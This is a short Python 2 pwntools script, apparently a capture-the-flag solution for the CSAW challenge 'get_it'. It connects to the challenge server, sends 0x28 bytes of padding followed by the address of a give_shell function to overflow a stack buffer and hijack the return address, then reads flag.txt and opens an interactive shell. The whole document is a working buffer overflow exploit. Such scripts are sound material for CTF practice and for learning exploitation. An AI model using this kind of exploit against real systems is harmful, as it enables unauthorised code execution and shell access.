#!/usr/bin/env python2

from pwn import *

GIVE_SHELL = 0x4005b6

# r = process('./get_it')
r = remote('pwn.chal.csaw.io', 9001)

r.recvline_startswith(' |___/')
r.sendline('a'*0x28 + p64(GIVE_SHELL))
r.sendline('cat flag.txt')
r.interactive()
